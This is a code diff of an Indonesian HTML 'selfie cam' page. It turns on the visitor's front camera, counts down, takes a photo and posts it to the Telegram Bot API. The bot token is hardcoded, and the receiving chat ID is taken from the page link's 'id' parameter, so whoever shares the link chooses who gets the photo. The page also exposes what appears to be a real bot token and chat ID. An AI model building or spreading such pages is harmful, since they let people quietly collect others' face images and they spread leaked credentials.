@@ -1,159 +1,144 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kamera Bot Hayabusa</title>
-    <style>
-        body { 
-            background: #121212; 
-            color: white; 
-            font-family: 'Segoe UI', sans-serif; 
-            text-align: center; 
-            margin: 0; padding: 20px; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;
-        }
-        h2 { margin-bottom: 10px; color: cyan; text-shadow: 0 0 10px cyan; }
-        
-        /* Tampilan Kamera (Mirror) */
-        .camera-frame {
-            position: relative;
-            width: 90%;
-            max-width: 400px;
-            border: 4px solid cyan;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
-        }
-        video {
-            width: 100%;
-            display: block;
-            transform: scaleX(-1); /* Biar kayak ngaca */
-        }
-        
-        /* Hitung Mundur */
-        #countdown {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 80px;
-            font-weight: bold;
-            color: white;
-            text-shadow: 0 0 20px black;
-            display: none;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hayabusa Selfie Cam</title>
 
-        button {
-            margin-top: 20px;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: bold;
-            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(0, 200, 255, 0.4);
-            transition: transform 0.2s;
-        }
-        button:active { transform: scale(0.95); }
-    </style>
+<style>
+body{
+  background:#121212;
+  color:white;
+  font-family:Segoe UI,sans-serif;
+  text-align:center;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  margin:0;
+}
+h2{color:cyan;text-shadow:0 0 10px cyan}
+.camera-frame{
+  width:90%;
+  max-width:400px;
+  border:4px solid cyan;
+  border-radius:20px;
+  overflow:hidden;
+  box-shadow:0 0 20px rgba(0,255,255,.5);
+  position:relative;
+}
+video{
+  width:100%;
+  transform:scaleX(-1);
+}
+#countdown{
+  position:absolute;
+  top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  font-size:72px;
+  display:none;
+}
+button{
+  margin-top:20px;
+  padding:14px 36px;
+  font-size:18px;
+  border:none;
+  border-radius:40px;
+  background:linear-gradient(45deg,#00d2ff,#3a7bd5);
+  color:white;
+  cursor:pointer;
+}
+</style>
 </head>
+
 <body>
 
-    <h2>📸 HAYABUSA SELFIE CAM</h2>
-    <p>Silakan pasang gaya terbaikmu!</p>
+<h2>📸 HAYABUSA SELFIE CAM</h2>
+<p>Pasang gaya terbaikmu</p>
 
-    <div class="camera-frame">
-        <video id="video" autoplay playsinline></video>
-        <div id="countdown">3</div>
-    </div>
+<div class="camera-frame">
+  <video id="video" autoplay playsinline></video>
+  <div id="countdown">3</div>
+</div>
 
-    <button id="btn-snap" onclick="startCountdown()">AMBIL FOTO 📸</button>
-    <canvas id="canvas" style="display:none;"></canvas>
+<button id="btn">AMBIL FOTO 📸</button>
+<canvas id="canvas" style="display:none"></canvas>
 
-    <script>
-        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI"; // Token Bot
-        const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get('id') || "7596509818";
+<script>
+const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
+const CHAT_ID = new URLSearchParams(location.search).get("id") || "7596509818";
 
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const countdownEl = document.getElementById("countdown");
-        const btnSnap = document.getElementById("btn-snap");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const btn = document.getElementById("btn");
+const cd = document.getElementById("countdown");
 
-        // Nyalakan Kamera (Langsung Tampil di Layar)
-        navigator.mediaDevices.getUserMedia({ 
-        navigator.mediaDevices.getUserMedia({
-  video: { facingMode: "user" }
-}).then(stream => {
+let cameraReady = false;
+
+// AKTIFKAN KAMERA
+navigator.mediaDevices.getUserMedia({
+  video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} }
+})
+.then(stream=>{
   video.srcObject = stream;
   video.play();
 
-  video.requestVideoFrameCallback(() => {
-    console.log("📸 Kamera benar-benar siap (frame valid)");
-    window.cameraReady = true;
+  // TUNGGU FRAME BENAR-BENAR SIAP (INI KUNCINYA)
+  video.requestVideoFrameCallback(()=>{
+    cameraReady = true;
+    console.log("Kamera siap, frame valid");
   });
-});
+})
+.catch(()=>alert("Izinkan kamera dulu bang"));
 
+// COUNTDOWN
+btn.onclick = ()=>{
+  if(!cameraReady) return alert("Kamera belum siap, tunggu sebentar...");
+  btn.style.display="none";
+  cd.style.display="block";
 
-        function startCountdown() {
-            btnSnap.style.display = "none"; // Sembunyikan tombol
-            countdownEl.style.display = "block"; // Munculkan angka
-            
-            let count = 3;
-            countdownEl.innerText = count;
+  let n=3;
+  cd.textContent=n;
 
-            const timer = setInterval(() => {
-                count--;
-                if (count > 0) {
-                    countdownEl.innerText = count;
-                } else {
-                    clearInterval(timer);
-                    countdownEl.innerText = "CHEESE! 📸";
-                    setTimeout(takeAndSend, 500); // Jepret sedikit setelah hitungan habis
-                }
-            }, 1000);
-        }
+  const t=setInterval(()=>{
+    n--;
+    if(n>0){
+      cd.textContent=n;
+    }else{
+      clearInterval(t);
+      cd.textContent="📸";
+      setTimeout(capture,300);
+    }
+  },1000);
+};
 
-        async function takeAndSend() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
+// CAPTURE SEKALI & KIRIM
+function capture(){
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
 
-    // --- JEPRETAN PERTAMA (BUAT MANASIN SENSOR / BUANG GELAP) ---
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0);
-    console.log("Jepretan pemanasan berhasil...");
+  ctx.translate(canvas.width,0);
+  ctx.scale(-1,1);
+  ctx.drawImage(video,0,0);
 
-    // Kasih jeda 700ms biar kamera bener-bener stabil cahayanya
-    await new Promise(resolve => setTimeout(resolve, 700));
+  canvas.toBlob(blob=>{
+    const fd=new FormData();
+    fd.append("chat_id",CHAT_ID);
+    fd.append("photo",blob,"selfie.jpg");
+    fd.append("caption","📸 SELFIE MASUK (BENING)");
 
-    // --- JEPRETAN KEDUA (INI YANG BENING & DIKIRIM) ---
-    ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0);
-
-    canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "selfie_bening.jpg");
-        formData.append("caption", "📸 **SELFIE BENING MASUK!**\nStatus: Sensor Udah Melek ✅");
-
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-        })
-        .then(() => {
-            alert("Foto berhasil dikirim ke Bot! ✅");
-            location.reload(); 
-        })
-        .catch(err => alert("Gagal kirim: " + err));
-    }, "image/jpeg", 0.9);
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{
+      method:"POST",
+      body:fd
+    }).then(()=>{
+      alert("Foto terkirim ✅");
+      location.reload();
+    }).catch(e=>alert("Gagal: "+e));
+  },"image/jpeg",0.9);
 }
-    </script>
+</script>
 
 </body>
 </html>
